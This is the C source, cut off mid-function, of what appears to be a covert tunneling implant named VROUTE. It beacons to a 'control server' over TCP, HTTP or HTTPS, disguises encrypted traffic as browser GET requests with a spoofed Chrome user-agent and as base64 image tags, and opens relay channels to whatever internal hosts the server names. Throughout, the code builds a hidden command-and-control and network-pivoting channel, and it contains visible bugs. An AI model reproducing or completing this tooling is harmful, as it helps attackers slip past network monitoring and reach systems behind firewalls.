/*

...

TODO:
- test
- add logging

TO-CHECK:
- compile with ASAN to detect memory corruption issues
- look for and fix memory leaks
- truncation issues with: ssize_t vs int?
- logic issues with is_https conditional blocks
- make sure you receive less bytes than you parse / use (oob reads)

FUTURE:
- change to new OpenSSL encryption escheme using EVP

Compilation:

$ gcc -o client client.c -lssl -lcrypto -lpthread

*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/select.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <ctype.h>
#include <stdarg.h>

#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/x509_vfy.h>

#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/evp.h>

#include "util.h"
#include "crypt.h"
#include "tp/base64.h"

#define DEBUG 1

#define VROUTE_VERSION "1.0.0"

#define CHALLENGE_DEFAULT_SIZE 64

#define OK_HTTP_RESPONSE "HTTP/1.1 200 OK"
#define DATA_PREFIX "<img src='data:image/jpeg;base64,"
#define DATA_SUFFIX "' />"
#define DEFAULT_HTTP_USER_AGENT "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
#define DEFAULT_HTTP_PATH "/index.html"

#define RELAY_BUFFER_SIZE 4096

#define COMMAND_CHANNEL 0

#define RELAY_TIMEOUT 60

#define MAX_CONCURRENT_CHANNELS 4096

#define MAGIC_DUMMY_FD 0x1337

#define MIN_HANDSHAKE_SESS_ID 11111
#define MAX_HANDSHAKE_SESS_ID 60000

#define AES_IV_SIZE 16

#define MIN_IV_CHAR_RANGE 0x1
#define MAX_IV_CHAR_RANGE 0xff

#define MAX_KEY_SIZE 64

#define MAX_HOSTNAME_SIZE 255

#if DEBUG

#define VR_LOG(...) vr_log(__func__, __VA_ARGS__)
#define hexdump(tag, mem, size) __hexdump(__func__, tag, mem, size)

#define MAX_LOG_MESSAGE_SIZE 4096
#define LOG_PREFIX_STR "[VROUTE]"

typedef enum {
    UNKNOWN_LOG_LEVEL = 0,
    LOG_WARN,
    LOG_INFO,
    LOG_DEBUG,
    LOG_ERROR,
} log_level_t;

#else

#define VR_LOG(ll, fmt, ...) ((void)0)
#define hexdump(tag, mem, size) ((void)0)

#endif

typedef enum {
    HTTPS_COM_PROTO = 0,
    HTTP_COM_PROTO = 1,
    TCP_COM_PROTO = 2
} proto_t;

typedef struct _channel_def {
    int channel_id;
    int sock;
    char *host;
    int port;
} channel_def;

typedef struct _cmd_def {
    int cmd;
    unsigned char value;
    char *name;
} cmd_def;

typedef struct __attribute__((packed)) _tlv_header {
    uint16_t client_id;
    uint16_t channel_id;
    uint16_t tlv_data_len;
} tlv_header;

typedef struct __attribute__((packed)) _s_cmd {
    uint8_t cmd;
    uint16_t channel_id;
} s_cmd;

typedef struct __attribute__((packed)) _conn_cmd {
    uint8_t cmd;
    uint16_t channel_id;
    uint32_t ip_addr;
    uint16_t port;
} conn_cmd;

typedef enum {
    UNKNOWN_CMD = 0,
    CHANNEL_OPEN_CMD,
    CHANNEL_CLOSE_CMD,
    RELAY_CLOSE_CMD,
    PING_CMD,
    FORWARD_CONNECTION_SUCCESS,
    FORWARD_CONNECTION_FAILURE
} scmd_t;

cmd_def cmd_def_data[] = {
    [UNKNOWN_CMD] = {
        .cmd = UNKNOWN_CMD,
        .value = 0,
        .name = "UNKNOWN_CMD"
    },
    [CHANNEL_OPEN_CMD] = {
        .cmd = CHANNEL_OPEN_CMD,
        .value = 0xdd,
        .name = "CHANNEL_OPEN_CMD"
    },
    [CHANNEL_CLOSE_CMD] = {
        .cmd = CHANNEL_CLOSE_CMD,
        .value = 0xcc,
        .name = "CHANNEL_CLOSE_CMD"
    },
    [RELAY_CLOSE_CMD] = {
        .cmd = RELAY_CLOSE_CMD,
        .value = 0xc4,
        .name = "RELAY_CLOSE_CMD"
    },
    [PING_CMD] = {
        .cmd = PING_CMD,
        .value = 0x70,
        .name = "PING_CMD"
    },
    [FORWARD_CONNECTION_SUCCESS] = {
        .cmd = FORWARD_CONNECTION_SUCCESS,
        .value = 0xee,
        .name = "FORWARD_CONNECTION_SUCCESS"
    },
    [FORWARD_CONNECTION_FAILURE] = {
        .cmd = FORWARD_CONNECTION_FAILURE,
        .value = 0xff,
        .name = "FORWARD_CONNECTION_FAILURE"
    }
};

int srv_down = 0;
long last_conn_time = 0;

char *_host = NULL;
int _port = 0;
int _ctl_sock = -1;
proto_t _proto = 0;
char *_key = NULL;
size_t _key_sz = 0;
SSL *_ssl = NULL;
SSL_CTX *_ctx = NULL;
X509 *_cert = NULL;

int client_id = 0;
uint64_t handshake_sess_id = 0;

pthread_mutex_t glb_conn_lock;
pthread_mutex_t main_loop_sock;

channel_def *global_conn = NULL;

int pending_ch_array[MAX_CONCURRENT_CHANNELS] = { 0 };

#if DEBUG

void vr_log(const char *func_name, log_level_t log_level, const char *format_str, ...) {
    char message[MAX_LOG_MESSAGE_SIZE + 1] = { 0 };
    char *log_level_prefix = NULL;
    
    if(!func_name || !format_str)
        return;
    
    if(log_level == UNKNOWN_LOG_LEVEL)
        return;
        
    if(log_level == LOG_WARN) {
        log_level_prefix = "[WARN]";
    } else if(log_level == LOG_INFO) {
        log_level_prefix = "[INFO]";
    } else if(log_level == LOG_DEBUG) {
        log_level_prefix = "[DEBUG]";
    } else if(log_level == LOG_ERROR) {
        log_level_prefix = "[ERROR]";
    } else
        return;
        
    va_list args;
    va_start(args, format_str);
    
    vsnprintf(message, MAX_LOG_MESSAGE_SIZE, format_str, args);
    
    va_end(args);
    
    printf("%s %s %s: %s\n", LOG_PREFIX_STR, log_level_prefix, func_name, message);
    
    return;
}

#endif

void ping_worker(void) {
    long curr_time = 0;

    while(1) {
        sleep(10);
        curr_time = time(NULL);
        if(srv_down) {
            VR_LOG(LOG_INFO, "Server is down! Closing...");
            pthread_exit(NULL);
            return;
        }

        #if 0
        if((curr_time - last_conn_time) > RELAY_TIMEOUT) {
            VR_LOG(LOG_ERROR, "No response from server for %ld seconds Restarting relay...", RELAY_TIMEOUT);
            pthread_exit(NULL);
        }
        #endif
    }
    pthread_exit(NULL);
    return;
}

void __ping_worker(void) {
    pthread_t th;
    pthread_create(&th, NULL, ping_worker, NULL);
    return;
}

void init_openssl(void) {
    SSL_load_error_strings();
    SSL_library_init();
    ERR_load_BIO_strings();
    OpenSSL_add_all_algorithms();
    return;
}

void destroy_ssl(void) {
    ERR_free_strings();
    EVP_cleanup();
    return;
}

uint64_t generate_handshake_sess_id(void) {
    uint64_t sess_id = (rand() % (MAX_HANDSHAKE_SESS_ID - MIN_HANDSHAKE_SESS_ID + 1)) + MIN_HANDSHAKE_SESS_ID;
    return sess_id;
} 

void close_wrp(int sock) {
    if(sock < 0 || sock == MAGIC_DUMMY_FD)
        return;
    close(sock);
    return;
}

void shutdown_relay(void) {
    srv_down = 1;
    return;
}

ssize_t http_write_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int is_https) {
    int r = 0;
    size_t sent = 0;
    char *ptr = NULL;
    size_t sz = 0;

    if(sock < 0 || !c_ssl || !data || !data_sz)
        return -1;

    if(data && data_sz) {
        ptr = *data;
        sz = *data_sz;
    }

    while(sent < sz) {
        if(is_https)
            r = SSL_write(c_ssl, ptr, sz - sent);
        else
            r = write(sock, ptr, sz - sent);
        if(r < 0)
            VR_LOG(LOG_ERROR, "Error writing data...");
            return -1;
        sent += r;
    }

    return sent;
}

ssize_t http_read_all(int sock, SSL *c_ssl, char **data, size_t *data_sz, int is_https) {
    int bytes_available = 0;
    int bavailable_x = 0;
    size_t sent = 0;
    int r = 0;
    int rx = 0;
    char *ptr = NULL;
    BIO *s_rbio = NULL;
    int s_fd = -1;
    int sock_m = -1;

    if(sock < 0 || !c_ssl || !data || !data_sz)
        return -1;

    *data = NULL;
    *data_sz = 0;

    sock_m = sock;

    if(is_https) {
    /*
    s_rbio = SSL_get_rbio(c_ssl);
    if(BIO_get_fd(s_rbio, &sock_m) < 0)
      return -1;
    */
        sock_m = SSL_get_fd(c_ssl);
        if(sock_m < 0) {
            VR_LOG(LOG_ERROR, "SSL_get_fd returned negative");
            return -1;
        }
    } else {
        sock_m = sock;
    }
  
    #if WINDOWS_OS
    r = ioctlsocket(sock_m, FIONREAD, &bytes_available);
    #else
    r = ioctl(sock_m, FIONREAD, &bytes_available);
    #endif
    if(r < 0) {
        VR_LOG(LOG_ERROR, "Error at ioctl() for FIONREAD");
        return -1;
    }

    if(bytes_available < 0) {
        *data = NULL;
        *data_sz = 0;
        return 0;
    }

    ptr = calloc(bytes_available + 1, sizeof(char));
    if(!ptr)
        return -1;

    sent = 0;
    while(sent < bytes_available) {
        if(is_https)
            r = SSL_read(c_ssl, ptr, bytes_available - sent);
        else
            r = read(sock, ptr, bytes_available - sent);
        if(r < 0) {
            VR_LOG(LOG_ERROR, "Error receiving data");
            return -1;
        }
      
        sent += r;
      
        #if WINDOWS_OS
        rx = ioctlsocket(sock_m, FIONREAD, &bavailable_x);
        #else
        rx = ioctl(sock_m, FIONREAD, &bavailable_x);
        #endif
        if(rx < 0) {
            VR_LOG(LOG_ERROR, "Error at ioctl() for FIONREAD");
            return -1;
        }
    
        if(bavailable_x <= 0)
            break;
    }

    *data = ptr;
    *data_sz = sent;

    return sent;
}

void http_close(int sock, SSL *c_ssl, int is_https) {
    if(is_https) {
        if(c_ssl) {
            SSL_free(c_ssl);
            c_ssl = NULL;
        }

        if(_cert) {
            X509_free(_cert);
            _cert = NULL;
        }

        if(_ctx) {
            SSL_CTX_free(_ctx);
            _ctx = NULL;
        }
    }

    if(sock != -1) {
        close(sock);
        sock = -1;
    }

    return;
}

int open_http_conn(char *host, int port, int is_https, SSL **c_ssl) {
    SSL_CTX *ctx = NULL;
    SSL *ssl = NULL;
    X509 *cert = NULL;
    X509_NAME *cert_name = NULL;
    X509_NAME *issuer_name = NULL;
    int sock = 0;
    struct sockaddr_in srvaddr, cli;
    char *name = NULL;

    if(!host || port == 0 || !c_ssl)
        return -1;

    *c_ssl = NULL;

    if(is_https) {
        if(SSL_library_init() < 0) {
            VR_LOG(LOG_ERROR, "Error at SSL_library_init");
            return -1;
        }

        if((ctx = SSL_CTX_new(TLS_client_method())) == NULL) {
            VR_LOG(LOG_ERROR, "Error opening new SSL context");
            return -1;
        }

        SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2);

        ssl = SSL_new(ctx);
        if(ssl == NULL) {
            VR_LOG(LOG_ERROR, "Error at SSL_new");
            return -1;
        }
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        VR_LOG(LOG_ERROR, "Error creating socket");
        return -1;
    }

    bzero(&srvaddr, sizeof(srvaddr));

    srvaddr.sin_family = AF_INET;
    srvaddr.sin_addr.s_addr = inet_addr(host);
    srvaddr.sin_port = htons(port);

    if(connect(sock, (struct sockaddr *)&srvaddr, sizeof(srvaddr)) != 0) {
        if(sock != -1)
            close(sock);
        VR_LOG(LOG_ERROR, "Error connecting to control server at: %s:%d", host, port);
        return -1;
    }

    if(is_https) {
        SSL_set_fd(ssl, sock);

        if(SSL_connect(ssl) != 1) {
            VR_LOG(LOG_ERROR, "Error trying to open SSL connection");
            return -1;
        }

        cert = SSL_get_peer_certificate(ssl);
        if(cert == NULL) {
            VR_LOG(LOG_ERROR, "Error getting peer certificate");
            return -1;
        }

        cert_name = X509_NAME_new();
        cert_name = X509_get_subject_name(cert);
        issuer_name = X509_get_issuer_name(cert);
        
        name = X509_NAME_oneline(cert_name, 0, 0);
        VR_LOG(LOG_INFO, "Cert subject: %s", name);
        
        if(name) {
            free(name);
            name = NULL;
        }
        
        name = X509_NAME_oneline(issuer_name, 0, 0);
        VR_LOG(LOG_INFO, "Cert Issuer: %s", name);

        if(name) {
            free(name);
            name = NULL;
        }
        
        _ssl = ssl;
        _ctx = ctx;
        _cert = cert;

        *c_ssl = ssl;
    }

    return sock;
}

ssize_t send_http_data(char *host, int port, char **data, size_t *data_size, int is_https) {
    ssize_t r = 0;
    char *http_req = NULL;
    int http_sock = -1;
    char *http_str = NULL;
    char *port_str = NULL;
    size_t http_req_sz = 0;
    SSL *c_ssl = NULL;
    char *b64_encoded = NULL;
    size_t b64_out_sz = 0;
    char *data_x = NULL;
    size_t data_sz_x = 0;
    char *dummy_rsp = NULL;
    size_t dummy_sz = 0;

    if(!host || port <= 0 || !data || !data_size)
        return -1;

    data_x = *data;
    data_sz_x = *data_size;

    http_str = base64_encode(data_x, data_sz_x, &b64_out_sz);
    if(http_str == NULL) {
        VR_LOG(LOG_ERROR, "Error when trying to do base64 encoding");
        return -1;
    }

    asprintf(&port_str, ":%d", port);
  
    if(handshake_sess_id != 0 && client_id == 0) {
        asprintf(&http_req, "GET %s?h=%ld HTTP/1.1\r\n"
                  "Host: %s%s\r\n"
                  "User-Agent: %s\r\n"
                  "Accept: */*\r\n"
                  "Content-Length: %lu\r\n"
                  "\r\ntoken=%s; expire=0;", DEFAULT_HTTP_PATH, handshake_sess_id, host, (port == 80) ? "" : port_str,
                            DEFAULT_HTTP_USER_AGENT, strlen(http_str) + 11, http_str);
    } else {
        asprintf(&http_req, "GET %s?cid=%d HTTP/1.1\r\n"
                  "Host: %s%s\r\n"
                  "User-Agent: %s\r\n"
                  "Accept: */*\r\n"
                  "Content-Length: %lu\r\n"
                  "\r\ntoken=%s; expire=0;", DEFAULT_HTTP_PATH, client_id, host, (port == 80) ? "" : port_str,
                            DEFAULT_HTTP_USER_AGENT, strlen(http_str) + 11, http_str);
    }

    if(port_str) {
        free(port_str);
        port_str = NULL;
    }

    http_sock = open_http_conn(host, port, is_https, &c_ssl);
    if(http_sock < 0) {
        VR_LOG(LOG_ERROR, "Error when trying to open an HTTP connection");
        return -1;
    }

    http_req_sz = strlen(http_req);
    r = http_write_all(http_sock, c_ssl, &http_req, &http_req_sz, is_https);
    if(r < 0) {
        if(http_sock != -1)
            http_close(http_sock, c_ssl, is_https);
        VR_LOG(LOG_ERROR, "Error when trying to send HTTP request");
        return -1;
    }

    r = http_read_all(http_sock, c_ssl, &dummy_rsp, &dummy_sz, is_https);
    if(r < 0) {
        if(http_sock != -1)
            http_close(http_sock, c_ssl, is_https);
        VR_LOG(LOG_ERROR, "Error when trying to receive HTTP response");
        return -1;
    }

    if(dummy_sz < strlen(OK_HTTP_RESPONSE) || memcmp(dummy_rsp, OK_HTTP_RESPONSE, strlen(OK_HTTP_RESPONSE)) != 0) {
        if(http_sock != -1)
            http_close(http_sock, c_ssl, is_https);
        VR_LOG(LOG_ERROR, "Received a non-OK HTTP response");
        return -1;
    }

    if(dummy_rsp) {
        free(dummy_rsp);
        dummy_rsp = NULL;
    }

    if(http_sock != -1)
        http_close(http_sock, c_ssl, is_https);

    if(http_req) {
        free(http_req);
        http_req = NULL;
    }

    return data_sz_x;
}

ssize_t recv_http_data(char *host, int port, char **data, size_t *data_size, int is_https) {
    ssize_t r = 0;
    int http_sock = -1;
    char *data_x = NULL;
    size_t data_sz_x = 0;
    char *tmp_p = NULL;
    char *data_s = NULL;
    size_t data_s_sz = 0;
    SSL *c_ssl = NULL;
    char *b64_decoded = NULL;
    size_t b64_decoded_sz = 0;
    char *http_req = NULL;
    char *port_str = NULL;
    size_t http_req_sz = 0;

    if(!host || port <= 0 || !data || !data_size)
        return -1;

    *data = NULL;
    *data_size = 0;

    http_sock = open_http_conn(host, port, is_https, &c_ssl);
    if(http_sock < 0) {
        VR_LOG(LOG_ERROR, "Error when trying to open an HTTP connection");
        return -1;
    }

    asprintf(&port_str, ":%d", port);

    if(handshake_sess_id != 0 || client_id == 0) {
        asprintf(&http_req, "GET %s?h=%ld HTTP/1.1\r\n"
                  "Host: %s%s\r\n"
                  "User-Agent: %s\r\n"
                  "Accept: */*\r\n"
                  "Content-Length: 0\r\n"
                  "\r\n", DEFAULT_HTTP_PATH, handshake_sess_id, host, (port == 80) ? "" : port_str,
                            DEFAULT_HTTP_USER_AGENT);
    } else {
        asprintf(&http_req, "GET %s?cid=%d HTTP/1.1\r\n"
                  "Host: %s%s\r\n"
                  "User-Agent: %s\r\n"
                  "Accept: */*\r\n"
                  "Content-Length: 0\r\n"
                  "\r\n", DEFAULT_HTTP_PATH, client_id, host, (port == 80) ? "" : port_str,
                            DEFAULT_HTTP_USER_AGENT);
    }

    http_req_sz = strlen(http_req);
    r = http_write_all(http_sock, c_ssl, &http_req, &http_req_sz, is_https);
    if(r < 0) {
        if(http_sock != -1)
            http_close(http_sock, c_ssl, is_https);
        VR_LOG(LOG_ERROR, "Error when tryng to send HTTP request");
        return -1;
    }

    if(http_req) {
        free(http_req);
        http_req = NULL;
    }

    r = http_read_all(http_sock, c_ssl, &data_x, &data_sz_x, is_https);
    if(r < 0) {
        if(http_sock != -1)
            http_close(http_sock, c_ssl, is_https);
        VR_LOG(LOG_ERROR, "Error when trying to receive HTTP response");
        return -1;
    }

    if(http_sock != -1)
        http_close(http_sock, c_ssl, is_https);

    if(data_sz_x == 0) {
        *data = NULL;
        *data_size = 0;

        if(data_x) {
            free(data_x);
            data_x = NULL;
        }
        VR_LOG(LOG_ERROR, "Data in HTTP response is 0");
        return 0;
    }

    tmp_p = strstr(data_x, DATA_PREFIX);
    if(!tmp_p) {
        if(data_x) {
            free(data_x);
            data_x = NULL;
        }
        VR_LOG(LOG_ERROR, "Prefix was not found in HTTP response");
        return -1;
    }
    tmp_p += strlen(DATA_PREFIX);
    data_s = tmp_p;

    tmp_p = strstr(data_s, DATA_SUFFIX);
    if(!tmp_p) {
        if(data_x) {
            free(data_x);
            data_x = NULL;
        }
        VR_LOG(LOG_ERROR, "Suffix was not found in HTTP response");
        return -1; 
    }
    *tmp_p = '\0';

    if(strlen(data_s) == 0) {
        if(data_x) {
            free(data_x);
            data_x = NULL;
        }

        if(data && data_size) {
            *data = NULL;
            *data_size = 0;
        }
        VR_LOG(LOG_ERROR, "No data between HTTP prefix-suffix scheme");
        return 0;
    }

    b64_decoded = base64_decode(data_s, strlen(data_s), &b64_decoded_sz);
    if(b64_decoded) {
        if(data_x) {
            free(data_x);
            data_x = NULL;
        }
        VR_LOG(LOG_ERROR, "Error when doing base64 decoding");
        return -1;
    }

    if(data_x) {
        free(data_x);
        data_x = NULL;
    }

    if(data && data_size) {
        *data = b64_decoded;
        *data_size = b64_decoded_sz;
    }

    return b64_decoded_sz;
}

ssize_t ctl_send_data(int sock, char *host, int port, char **data, size_t *data_size, proto_t proto) {
    ssize_t r = 0;
    char *data_x = NULL;
    size_t data_size_x = 0;

    if(sock < 0 || !host || port <= 0 || !data || !data_size)
        return -1;

    if(data && data_size) {
        data_x = *data;
        data_size_x = *data_size;
    }

    if(proto == TCP_COM_PROTO) {
        r = write_all(sock, &data_x, &data_size_x);
    } else if(proto == HTTP_COM_PROTO) {
        r = send_http_data(host, port, &data_x, &data_size_x, 0);
    } else if(proto == HTTPS_COM_PROTO) {
        r = send_http_data(host, port, &data_x, &data_size_x, 1);
    } else {
        VR_LOG(LOG_ERROR, "Unknown protocol provided for sending data");
        return -1;
    }

    if(r < 0) {
        VR_LOG(LOG_ERROR, "Error sending data to control server");
        return -1;
    }

    return r;
}

ssize_t ctl_recv_data(int sock, char *host, int port, char **data, size_t *data_size, proto_t proto) {
    ssize_t r = 0;
    char *data_x = NULL;
    size_t data_size_x = 0;

    if(sock < 0 || !host || port <= 0 || !data || !data_size)
        return -1;

    *data = NULL;
    *data_size = 0;

    if(proto == TCP_COM_PROTO) {
        r = read_all(sock, &data_x, &data_size_x);
    } else if(proto == HTTP_COM_PROTO) {
        r = recv_http_data(host, port, &data_x, &data_size_x, 0);
    } else if(proto == HTTPS_COM_PROTO) {
        r = recv_http_data(host, port, &data_x, &data_size_x, 1);
    } else {
        VR_LOG(LOG_ERROR, "Unknown protocol provided for receiving data...");
        return -1;
    }

    if(r < 0) {
        VR_LOG(LOG_ERROR, "Error receiving data from control server...");
        return -1;
    }

    if(data && data_size) {
        *data = data_x;
        *data_size = data_size_x;
    }

    return r;
}

int connect_ctl_srv(char *host, int port) {
    int sock = 0;
    struct sockaddr_in srvaddr, cli;

    if(!host || port == 0)
        return 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        VR_LOG(LOG_ERROR, "Error creating socket");
        return -1;
    }

    bzero(&srvaddr, sizeof(srvaddr));

    srvaddr.sin_family = AF_INET;
    srvaddr.sin_addr.s_addr = inet_addr(host);
    srvaddr.sin_port = htons(port);
    
    VR_LOG(LOG_INFO, "Connecting to control server at: %s:%d", host, port);

    if(connect(sock, (struct sockaddr *)&srvaddr, sizeof(srvaddr)) < 0) {
        close(sock);
        return -1;
    }
    
    VR_LOG(LOG_INFO, "Connection was successful with control server...");

    return sock;
}

int send_cmd(char *cmd, size_t cmd_sz) {
    ssize_t r = 0;
    ssize_t rx = 0;
    char *tlv_packet = NULL;
    tlv_header *tlv_p = NULL;
    char *data_x = NULL;
    size_t data_sz_x = 0;
    char *enc = NULL;
    size_t enc_sz = 0;

    if(cmd == NULL || cmd_sz == 0)
        return 0;

    tlv_packet = calloc(sizeof(tlv_header) + cmd_sz, sizeof(char));
    if(!tlv_packet)
        return 0;
    tlv_p = (tlv_header *)tlv_packet;

    tlv_p->channel_id = COMMAND_CHANNEL;
    tlv_p->tlv_data_len = cmd_sz;

    memcpy(tlv_packet + sizeof(tlv_header), cmd, cmd_sz);

    data_x = tlv_packet;
    data_sz_x = sizeof(tlv_header) + cmd_sz;
  
    enc = encrypt_data(data_x, data_sz_x, _key, _key_sz, &enc_sz);
    if(!enc) {
        if(tlv_packet) {
            free(tlv_packet);
            tlv_packet = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to encrypt data");
        return 0;
    }
  
    rx = ctl_send_data(_ctl_sock, _host, _port, &enc, &enc_sz, _proto);
    if(rx < 0) {
        if(tlv_packet) {
            free(tlv_packet);
            tlv_packet = NULL;
        }
        if(enc) {
            free(enc);
            enc = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to send data to control server");
        return 0;
    }

    if(tlv_packet) {
        free(tlv_packet);
        tlv_packet = NULL;
    }
  
    if(enc) {
        free(enc);
        enc = NULL;
    }
  
    return 1;
}

int send_remote_cmd(scmd_t cmd, int channel_id) {
    s_cmd *cmd_p = NULL;

    char *cmd_data = NULL;
    size_t cmd_data_sz = 0;

    if(channel_id < 0 || cmd == UNKNOWN_CMD)
        return 0;

    if(cmd < 0 || cmd >= sizeof(cmd_def_data))
        return 0;

    cmd_data_sz = sizeof(s_cmd);
    cmd_data = calloc(cmd_data_sz, sizeof(char));
    if(!cmd_data)
        return 0;
    cmd_p = (s_cmd *)cmd_data;

    switch(cmd) {
        case CHANNEL_CLOSE_CMD:
        case FORWARD_CONNECTION_SUCCESS:
        case FORWARD_CONNECTION_FAILURE:
            break;
        default:
            VR_LOG(LOG_ERROR, "Command not found");
            return 0;
    }
    
    VR_LOG(LOG_INFO, "Sending command '%s' to control server", cmd_def_data[cmd].name);

    cmd_p->cmd = cmd_def_data[cmd].value;
    cmd_p->channel_id = channel_id;

    if(!send_cmd(cmd_data, cmd_data_sz)) {
        if(cmd_data) {
            free(cmd_data);
            cmd_data = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to send remote CMD to control server...");
        return 0;
    }

    if(cmd_data) {
        free(cmd_data);
        cmd_data = NULL;
    }

    return 1;
}

int channel_id_exists(int channel_id) {
    int idx = -1;

    if(channel_id <= 0)
        return 0;

    pthread_mutex_lock(&glb_conn_lock);

    for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
        if(global_conn[i].channel_id && global_conn[i].channel_id == channel_id) {
            idx = i;
            break;
        }
    }

    if(idx == -1) {
        pthread_mutex_unlock(&glb_conn_lock);
        return 0;
    }

    pthread_mutex_unlock(&glb_conn_lock);
    return 1;
}

int open_channel_conn(int channel_id, char *host, int port) {
    int sock = 0;
    int idx = -1;
    int found = 0;
    struct sockaddr_in srvaddr, cli;

    if(!host || port == 0)
        return 0;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == -1) {
        VR_LOG(LOG_ERROR, "Error creating socket...");
        return 0;
    }

    bzero(&srvaddr, sizeof(srvaddr));

    srvaddr.sin_family = AF_INET;
    srvaddr.sin_addr.s_addr = inet_addr(host);
    srvaddr.sin_port = htons(port);
    
    VR_LOG(LOG_INFO, "Connecting to %s:%d (channel ID: %d)", host, port, channel_id);

    if(connect(sock, (struct sockaddr *)&srvaddr, sizeof(srvaddr)) < 0) {
        VR_LOG(LOG_ERROR, "Error connecting to target...");
        close(sock);
        return 0;
    }

    //pthread_mutex_lock(&glb_conn_lock);

    for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
        if(global_conn[i].channel_id == channel_id) {
            VR_LOG(LOG_WARN, "Found channel ID already created. Closing it...");
            close_channel(channel_id);
        }
    }
        
    for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
        if(pending_ch_array[x] == 0) {
            found = 1;
            pending_ch_array[x] = sock;
            break;
        }
    }
    
    if(!found) {
        VR_LOG(LOG_ERROR, "Could not find empty slot in pending_ch_array");
        //pthread_mutex_unlock(&glb_conn_lock);
        return -1;
    }

    for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
        if(global_conn[i].channel_id == 0) {
            idx = i;
            break;
        }
    }

    if(idx == -1) {
        VR_LOG(LOG_ERROR, "Could not find empty slot in global_conn");
        close(sock);
        //pthread_mutex_unlock(&glb_conn_lock);
        return 0;
    }

    global_conn[idx].channel_id = channel_id;
    global_conn[idx].sock = sock;
    global_conn[idx].host = strdup(host);
    global_conn[idx].port = (uint16_t)port;

    //pthread_mutex_unlock(&glb_conn_lock);
    
    VR_LOG(LOG_INFO, "Opened connection. Channel ID: %d", channel_id);

    return channel_id;
}

void close_channel_conn(int sock) {
    if(sock == -1)
        return;

    close_wrp(sock);

    return;
}

int close_channel(int channel_id) {
    int idx = -1;

    if(channel_id <= 0)
        return 0;

    pthread_mutex_lock(&glb_conn_lock);

    for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
        if(global_conn[i].channel_id != 0 && global_conn[i].channel_id == channel_id) {
            idx = i;
            break;
        }
    }

    if(idx == -1) {
        VR_LOG(LOG_ERROR, "Could not find channel_id (%d) in global conn", channel_id);
        pthread_mutex_unlock(&glb_conn_lock);
        return 0;
    }

    global_conn[idx].port = 0;

    if(global_conn[idx].host) {
        free(global_conn[idx].host);
        global_conn[idx].host = NULL;
    }

    if(global_conn[idx].sock != -1) {
        close_channel_conn(global_conn[idx].sock);
        global_conn[idx].sock = -1;
    }

    global_conn[idx].channel_id = 0;

    pthread_mutex_unlock(&glb_conn_lock);

    return 1;
}

int get_sock_by_channel_id(int channel_id) {
    int idx = -1;
    int sock = -1;

    pthread_mutex_lock(&glb_conn_lock);

    for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
        if(global_conn[x].channel_id == channel_id) {
            idx = x;
            break;
        }
    }

    if(idx == -1) {
        VR_LOG(LOG_ERROR, "Could not find channel_id (%d) in global_conn", channel_id);
        pthread_mutex_unlock(&glb_conn_lock);
        return -1;
    }

    sock = global_conn[idx].sock;

    pthread_mutex_unlock(&glb_conn_lock);
    return sock;
}

int get_channel_id_by_sock(int sock) {
    int idx = -1;
    int channel_id = -1;

    pthread_mutex_lock(&glb_conn_lock);

    for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
        if(global_conn[x].sock == sock) {
            idx = x;
            break;
        }
    }

    if(idx == -1) {
        VR_LOG(LOG_ERROR, "Could not find sock (%d) in global_conn...", sock);
        pthread_mutex_unlock(&glb_conn_lock);
        return -1;
    }

    channel_id = global_conn[idx].channel_id;

    pthread_mutex_unlock(&glb_conn_lock);
    return channel_id;
}

int relay_data(int sock, char *data, size_t data_sz) {
    int r = 0;

    if(sock == -1 || !data || data_sz == 0)
        return 0;

    r = write(sock, data, data_sz);
    if(r < 0) {
        VR_LOG(LOG_ERROR, "Error relaying data to destination...");
        return 0;
    }
    
    return 1;
}

ssize_t send_data_to_ctl_srv(char *data, size_t data_sz) {
    ssize_t rx = 0;
    char *data_x = NULL;
    size_t data_sz_x = 0;
    char *enc = NULL;
    size_t enc_sz = 0;

    if(!data || data_sz == 0)
        return 0;

    data_x = data;
    data_sz_x = data_sz;
  
    enc = encrypt_data(data_x, data_sz_x, _key, _key_sz, &enc_sz);
    if(!enc || enc_sz == 0) {
        VR_LOG(LOG_ERROR, "Error trying to encrypt data");
        return 0;
    }

    rx = ctl_send_data(_ctl_sock, _host, _port, &enc, &enc_sz, _proto);
    if(rx < 0) {
        if(enc) {
            free(enc);
            enc = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to send data to control server...");
        return 0;
    }
  
    if(enc) {
        free(enc);
        enc = NULL;
    }

    return 1;
}

int interpret_remote_cmd(char *cmd, size_t cmd_sz) {
    s_cmd *s_hdr = NULL;
    conn_cmd *c_data = NULL;
    uint8_t cmd_c = 0;
    uint32_t ip_addr = 0;
    char *host = NULL; 
    uint16_t port = 0;
    int channel_id = 0;
    struct sockaddr_in dummy_in;

    if(!cmd || cmd_sz == 0)
        return 0;

    if(cmd_sz < sizeof(s_cmd))
        return 0;

    s_hdr = ((s_cmd *)cmd);
    c_data = (conn_cmd *)cmd;

    cmd_c = s_hdr->cmd;

    if(cmd_c == cmd_def_data[CHANNEL_OPEN_CMD].value) {
